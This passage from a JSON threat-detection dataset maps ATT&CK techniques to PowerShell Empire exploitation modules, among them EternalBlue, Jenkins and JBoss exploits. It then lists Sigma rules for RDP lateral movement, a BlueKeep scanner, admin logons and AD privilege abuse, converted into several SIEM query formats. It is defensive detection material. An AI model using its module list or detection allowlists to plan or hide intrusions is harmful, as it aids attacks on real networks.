Services", "ATT&CK Technique #2": "T1190", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_jboss\":  [\"T1210\",\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1210", "Empire Module": "powershell/exploitation/exploit_jenkins", "Technique": "Exploitation of Remote Services", "ATT&CK Technique #2": "T1190", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_jenkins\":  [\"T1210\",\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1210", "Empire Module": "powershell/situational_awareness/network/get_exploitable_system", "Technique": "Exploitation of Remote Services", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_exploitable_system\":  [\"T1210\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1210", "Empire Module": "powershell/exploitation/exploit_eternalblue", "Technique": "Exploitation of Remote Services", "ATT&CK Technique #2": "T1212", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_eternalblue\":  [\"T1210\",\"T1212\"],"}}], "queries": [{"query": "title: Suspicious Outbound RDP Connections\nid: ed74fe75-7594-4b4b-ae38-e38e3fd2eb23\nstatus: experimental\ndescription: Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement\nreferences:\n    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\nauthor: Markus Neis - Swisscom\ndate: 2019/05/15\ntags:\n    - attack.lateral_movement\n    - attack.t1210\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        DestinationPort: 3389\n        Initiated: 'true'\n    filter:\n        Image:\n            - '*\\mstsc.exe'\n            - '*\\RTSApp.exe'\n            - '*\\RTS2App.exe'\n            - '*\\RDCMan.exe'\n            - '*\\ws_TunnelService.exe'\n            - '*\\RSSensor.exe'\n            - '*\\RemoteDesktopManagerFree.exe'\n            - '*\\RemoteDesktopManager.exe'\n            - '*\\RemoteDesktopManager64.exe'\n            - '*\\mRemoteNG.exe'\n            - '*\\mRemote.exe'\n            - '*\\Terminals.exe'\n            - '*\\spiceworks-finder.exe'\n            - '*\\FSDiscovery.exe'\n            - '*\\FSAssessment.exe'\n            - '*\\MobaRTE.exe'\n            - '*\\chrome.exe'\n            - '*\\thor.exe'\n            - '*\\thor64.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other Remote Desktop RDP tools\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Outbound RDP Connections\nid: ed74fe75-7594-4b4b-ae38-e38e3fd2eb23\nstatus: experimental\ndescription: Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement\nreferences:\n    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\nauthor: Markus Neis - Swisscom\ndate: 2019/05/15\ntags:\n    - attack.lateral_movement\n    - attack.t1210\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        DestinationPort: 3389\n        Initiated: 'true'\n    filter:\n        Image:\n            - '*\\mstsc.exe'\n            - '*\\RTSApp.exe'\n            - '*\\RTS2App.exe'\n            - '*\\RDCMan.exe'\n            - '*\\ws_TunnelService.exe'\n            - '*\\RSSensor.exe'\n            - '*\\RemoteDesktopManagerFree.exe'\n            - '*\\RemoteDesktopManager.exe'\n            - '*\\RemoteDesktopManager64.exe'\n            - '*\\mRemoteNG.exe'\n            - '*\\mRemote.exe'\n            - '*\\Terminals.exe'\n            - '*\\spiceworks-finder.exe'\n            - '*\\FSDiscovery.exe'\n            - '*\\FSAssessment.exe'\n            - '*\\MobaRTE.exe'\n            - '*\\chrome.exe'\n            - '*\\thor.exe'\n            - '*\\thor64.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other Remote Desktop RDP tools\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND DestinationPort:\"3389\" AND Initiated:\"true\") AND (NOT (Image.keyword:(*\\\\\\\\mstsc.exe OR *\\\\\\\\RTSApp.exe OR *\\\\\\\\RTS2App.exe OR *\\\\\\\\RDCMan.exe OR *\\\\\\\\ws_TunnelService.exe OR *\\\\\\\\RSSensor.exe OR *\\\\\\\\RemoteDesktopManagerFree.exe OR *\\\\\\\\RemoteDesktopManager.exe OR *\\\\\\\\RemoteDesktopManager64.exe OR *\\\\\\\\mRemoteNG.exe OR *\\\\\\\\mRemote.exe OR *\\\\\\\\Terminals.exe OR *\\\\\\\\spiceworks\\\\-finder.exe OR *\\\\\\\\FSDiscovery.exe OR *\\\\\\\\FSAssessment.exe OR *\\\\\\\\MobaRTE.exe OR *\\\\\\\\chrome.exe OR *\\\\\\\\thor.exe OR *\\\\\\\\thor64.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Outbound-RDP-Connections <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Outbound RDP Connections\",\\n    \"description\": \"Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1210\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:\\\\\"3389\\\\\" AND Initiated:\\\\\"true\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\mstsc.exe OR *\\\\\\\\\\\\\\\\RTSApp.exe OR *\\\\\\\\\\\\\\\\RTS2App.exe OR *\\\\\\\\\\\\\\\\RDCMan.exe OR *\\\\\\\\\\\\\\\\ws_TunnelService.exe OR *\\\\\\\\\\\\\\\\RSSensor.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManagerFree.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManager.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManager64.exe OR *\\\\\\\\\\\\\\\\mRemoteNG.exe OR *\\\\\\\\\\\\\\\\mRemote.exe OR *\\\\\\\\\\\\\\\\Terminals.exe OR *\\\\\\\\\\\\\\\\spiceworks\\\\\\\\-finder.exe OR *\\\\\\\\\\\\\\\\FSDiscovery.exe OR *\\\\\\\\\\\\\\\\FSAssessment.exe OR *\\\\\\\\\\\\\\\\MobaRTE.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\thor.exe OR *\\\\\\\\\\\\\\\\thor64.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:\\\\\"3389\\\\\" AND Initiated:\\\\\"true\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\mstsc.exe OR *\\\\\\\\\\\\\\\\RTSApp.exe OR *\\\\\\\\\\\\\\\\RTS2App.exe OR *\\\\\\\\\\\\\\\\RDCMan.exe OR *\\\\\\\\\\\\\\\\ws_TunnelService.exe OR *\\\\\\\\\\\\\\\\RSSensor.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManagerFree.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManager.exe OR *\\\\\\\\\\\\\\\\RemoteDesktopManager64.exe OR *\\\\\\\\\\\\\\\\mRemoteNG.exe OR *\\\\\\\\\\\\\\\\mRemote.exe OR *\\\\\\\\\\\\\\\\Terminals.exe OR *\\\\\\\\\\\\\\\\spiceworks\\\\\\\\-finder.exe OR *\\\\\\\\\\\\\\\\FSDiscovery.exe OR *\\\\\\\\\\\\\\\\FSAssessment.exe OR *\\\\\\\\\\\\\\\\MobaRTE.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\thor.exe OR *\\\\\\\\\\\\\\\\thor64.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Outbound RDP Connections\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND DestinationPort:\"3389\" AND Initiated:\"true\") AND (NOT (Image.keyword:(*\\\\\\\\mstsc.exe *\\\\\\\\RTSApp.exe *\\\\\\\\RTS2App.exe *\\\\\\\\RDCMan.exe *\\\\\\\\ws_TunnelService.exe *\\\\\\\\RSSensor.exe *\\\\\\\\RemoteDesktopManagerFree.exe *\\\\\\\\RemoteDesktopManager.exe *\\\\\\\\RemoteDesktopManager64.exe *\\\\\\\\mRemoteNG.exe *\\\\\\\\mRemote.exe *\\\\\\\\Terminals.exe *\\\\\\\\spiceworks\\\\-finder.exe *\\\\\\\\FSDiscovery.exe *\\\\\\\\FSAssessment.exe *\\\\\\\\MobaRTE.exe *\\\\\\\\chrome.exe *\\\\\\\\thor.exe *\\\\\\\\thor64.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" DestinationPort=\"3389\" Initiated=\"true\") NOT ((Image=\"*\\\\\\\\mstsc.exe\" OR Image=\"*\\\\\\\\RTSApp.exe\" OR Image=\"*\\\\\\\\RTS2App.exe\" OR Image=\"*\\\\\\\\RDCMan.exe\" OR Image=\"*\\\\\\\\ws_TunnelService.exe\" OR Image=\"*\\\\\\\\RSSensor.exe\" OR Image=\"*\\\\\\\\RemoteDesktopManagerFree.exe\" OR Image=\"*\\\\\\\\RemoteDesktopManager.exe\" OR Image=\"*\\\\\\\\RemoteDesktopManager64.exe\" OR Image=\"*\\\\\\\\mRemoteNG.exe\" OR Image=\"*\\\\\\\\mRemote.exe\" OR Image=\"*\\\\\\\\Terminals.exe\" OR Image=\"*\\\\\\\\spiceworks-finder.exe\" OR Image=\"*\\\\\\\\FSDiscovery.exe\" OR Image=\"*\\\\\\\\FSAssessment.exe\" OR Image=\"*\\\\\\\\MobaRTE.exe\" OR Image=\"*\\\\\\\\chrome.exe\" OR Image=\"*\\\\\\\\thor.exe\" OR Image=\"*\\\\\\\\thor64.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" DestinationPort=\"3389\" Initiated=\"true\")  -(Image IN [\"*\\\\\\\\mstsc.exe\", \"*\\\\\\\\RTSApp.exe\", \"*\\\\\\\\RTS2App.exe\", \"*\\\\\\\\RDCMan.exe\", \"*\\\\\\\\ws_TunnelService.exe\", \"*\\\\\\\\RSSensor.exe\", \"*\\\\\\\\RemoteDesktopManagerFree.exe\", \"*\\\\\\\\RemoteDesktopManager.exe\", \"*\\\\\\\\RemoteDesktopManager64.exe\", \"*\\\\\\\\mRemoteNG.exe\", \"*\\\\\\\\mRemote.exe\", \"*\\\\\\\\Terminals.exe\", \"*\\\\\\\\spiceworks-finder.exe\", \"*\\\\\\\\FSDiscovery.exe\", \"*\\\\\\\\FSAssessment.exe\", \"*\\\\\\\\MobaRTE.exe\", \"*\\\\\\\\chrome.exe\", \"*\\\\\\\\thor.exe\", \"*\\\\\\\\thor64.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*3389)(?=.*true)))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\mstsc\\\\.exe|.*.*\\\\RTSApp\\\\.exe|.*.*\\\\RTS2App\\\\.exe|.*.*\\\\RDCMan\\\\.exe|.*.*\\\\ws_TunnelService\\\\.exe|.*.*\\\\RSSensor\\\\.exe|.*.*\\\\RemoteDesktopManagerFree\\\\.exe|.*.*\\\\RemoteDesktopManager\\\\.exe|.*.*\\\\RemoteDesktopManager64\\\\.exe|.*.*\\\\mRemoteNG\\\\.exe|.*.*\\\\mRemote\\\\.exe|.*.*\\\\Terminals\\\\.exe|.*.*\\\\spiceworks-finder\\\\.exe|.*.*\\\\FSDiscovery\\\\.exe|.*.*\\\\FSAssessment\\\\.exe|.*.*\\\\MobaRTE\\\\.exe|.*.*\\\\chrome\\\\.exe|.*.*\\\\thor\\\\.exe|.*.*\\\\thor64\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Scanner PoC for CVE-2019-0708 RDP RCE vuln\nid: 8400629e-79a9-4737-b387-5db940ab2367\ndescription: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to  CVE-2019-0708 RDP RCE aka BlueKeep\nreferences:\n    - https://twitter.com/AdamTheAnalyst/status/1134394070045003776\n    - https://github.com/zerosum0x0/CVE-2019-0708\ntags:\n    - attack.lateral_movement\n    - attack.t1210\n    - car.2013-07-002\nauthor: Florian Roth (rule), Adam Bradbury (idea)\ndate: 2019/06/02\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4625\n        AccountName: AAAAAAA\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Scanner PoC for CVE-2019-0708 RDP RCE vuln\nid: 8400629e-79a9-4737-b387-5db940ab2367\ndescription: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to  CVE-2019-0708 RDP RCE aka BlueKeep\nreferences:\n    - https://twitter.com/AdamTheAnalyst/status/1134394070045003776\n    - https://github.com/zerosum0x0/CVE-2019-0708\ntags:\n    - attack.lateral_movement\n    - attack.t1210\n    - car.2013-07-002\nauthor: Florian Roth (rule), Adam Bradbury (idea)\ndate: 2019/06/02\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4625\n        AccountName: AAAAAAA\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4625\" AND AccountName:\"AAAAAAA\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Scanner-PoC-for-CVE-2019-0708-RDP-RCE-vuln <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Scanner PoC for CVE-2019-0708 RDP RCE vuln\",\\n    \"description\": \"Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to  CVE-2019-0708 RDP RCE aka BlueKeep\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1210\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4625\\\\\" AND AccountName:\\\\\"AAAAAAA\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4625\\\\\" AND AccountName:\\\\\"AAAAAAA\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Scanner PoC for CVE-2019-0708 RDP RCE vuln\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4625\" AND AccountName:\"AAAAAAA\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4625\" AccountName=\"AAAAAAA\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4625\" AccountName=\"AAAAAAA\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4625)(?=.*AAAAAAA))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1078", "parsed_datasets": [], "queries": [{"query": "title: Admin User Remote Logon\nid: 0f63e1ef-1eb9-4226-9d54-8927ca08520a\ndescription: Detect remote login by Administrator user depending on internal pattern\nreferences:\n    - https://car.mitre.org/wiki/CAR-2016-04-005\ntags:\n    - attack.lateral_movement\n    - attack.t1078\n    - car.2016-04-005\nstatus: experimental\nauthor: juju4\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Identifiable administrators usernames (pattern or special unique character. ex: \"Admin-*\"), internal policy mandating use only as secondary account'\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 10\n        AuthenticationPackageName: Negotiate\n        AccountName: 'Admin-*'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Admin User Remote Logon\nid: 0f63e1ef-1eb9-4226-9d54-8927ca08520a\ndescription: Detect remote login by Administrator user depending on internal pattern\nreferences:\n    - https://car.mitre.org/wiki/CAR-2016-04-005\ntags:\n    - attack.lateral_movement\n    - attack.t1078\n    - car.2016-04-005\nstatus: experimental\nauthor: juju4\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Identifiable administrators usernames (pattern or special unique character. ex: \"Admin-*\"), internal policy mandating use only as secondary account'\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 10\n        AuthenticationPackageName: Negotiate\n        AccountName: 'Admin-*'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4624\" AND LogonType:\"10\" AND AuthenticationPackageName:\"Negotiate\" AND AccountName.keyword:Admin\\\\-*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Admin-User-Remote-Logon <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Admin User Remote Logon\",\\n    \"description\": \"Detect remote login by Administrator user depending on internal pattern\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1078\",\\n      \"car.2016-04-005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"10\\\\\" AND AuthenticationPackageName:\\\\\"Negotiate\\\\\" AND AccountName.keyword:Admin\\\\\\\\-*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"10\\\\\" AND AuthenticationPackageName:\\\\\"Negotiate\\\\\" AND AccountName.keyword:Admin\\\\\\\\-*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Admin User Remote Logon\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4624\" AND LogonType:\"10\" AND AuthenticationPackageName:\"Negotiate\" AND AccountName.keyword:Admin\\\\-*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4624\" LogonType=\"10\" AuthenticationPackageName=\"Negotiate\" AccountName=\"Admin-*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4624\" logon_type=\"10\" AuthenticationPackageName=\"Negotiate\" AccountName=\"Admin-*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4624)(?=.*10)(?=.*Negotiate)(?=.*Admin-.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Enabled User Right in AD to Control User Objects\nid: 311b6ce2-7890-4383-a8c2-663a9f6b43cd\ndescription: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.\ntags:\n    - attack.privilege_escalation\n    - attack.t1078\nreferences:\n    - https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/\nauthor: '@neu5ron'\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Policy Change > Audit Authorization Policy Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change'\ndetection:\n    selection:\n        EventID: 4704\n    keywords:\n        Message:\n            - '*SeEnableDelegationPrivilege*'\n    condition: all of them\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Enabled User Right in AD to Control User Objects\nid: 311b6ce2-7890-4383-a8c2-663a9f6b43cd\ndescription: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.\ntags:\n    - attack.privilege_escalation\n    - attack.t1078\nreferences:\n    - https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/\nauthor: '@neu5ron'\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Policy Change > Audit Authorization Policy Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change'\ndetection:\n    selection:\n        EventID: 4704\n    keywords:\n        Message:\n            - '*SeEnableDelegationPrivilege*'\n    condition: all of them\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4704\" AND Message.keyword:(*SeEnableDelegationPrivilege*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Enabled-User-Right-in-AD-to-Control-User-Objects <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Enabled User Right in AD to Control User Objects\",\\n    \"description\": \"Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1078\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4704\\\\\" AND Message.keyword:(*SeEnableDelegationPrivilege*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4704\\\\\" AND Message.keyword:(*SeEnableDelegationPrivilege*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Enabled User Right in AD to Control User Objects\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4704\" AND Message.keyword:(*SeEnableDelegationPrivilege*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4704\" (Message=\"*SeEnableDelegationPrivilege*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4704\" Message IN [\"*SeEnableDelegationPrivilege*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4704)(?=.*(?:.*.*SeEnableDelegationPrivilege.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Account Tampering - Suspicious Failed Logon Reasons\nid: 9eb99343-d336-4020-a3cd-67f3819e68ee\ndescription: This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow\n    restricted.\nauthor: Florian Roth\nmodified: 2019/03/01\nreferences:\n    - https://twitter.com/SBousseaden/status/1101431884540710913\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4625\n            - 4776\n        Status:\n            - '0xC0000072'  # User logon to account disabled by administrator\n            - '0xC000006F'  # User logon outside authorized hours\n            - '0xC0000070'  # User logon from unauthorized workstation\n            - '0xC0000413'  # Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine\n            - '0xC000018C'  # The logon request failed because the trust relationship between the primary domain and the trusted domain failed\n            - '0xC000015B'  # The user has not been granted the requested logon type (aka logon right) at this machine\n    condition: selection\nfalsepositives:\n    - User using a disabled account\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Account Tampering - Suspicious Failed Logon Reasons\nid: 9eb99343-d336-4020-a3cd-67f3819e68ee\ndescription: This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow\n    restricted.\nauthor: Florian Roth\nmodified: 2019/03/01\nreferences:\n    - https://twitter.com/SBousseaden/status/1101431884540710913\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4625\n            - 4776\n        Status:\n            - '0xC0000072'  # User logon to account disabled by administrator\n            - '0xC000006F'  # User logon outside authorized hours\n            - '0xC0000070'  # User logon from unauthorized workstation\n            - '0xC0000413'  # Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine\n            - '0xC000018C'  # The logon request failed because the trust relationship between the primary domain and the trusted domain failed\n            - '0xC000015B'  # The user has not been granted the requested logon type (aka logon right) at this machine\n    condition: selection\nfalsepositives:\n    - User using a disabled account\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4625\" OR \"4776\") AND Status:(\"0xC0000072\" OR \"0xC000006F\" OR \"0xC0000070\" OR \"0xC0000413\" OR \"0xC000018C\" OR \"0xC000015B\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Account-Tampering---Suspicious-Failed-Logon-Reasons <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Account Tampering - Suspicious Failed Logon Reasons\",\\n    \"description\": \"This method uses uncommon error codes on failed logons 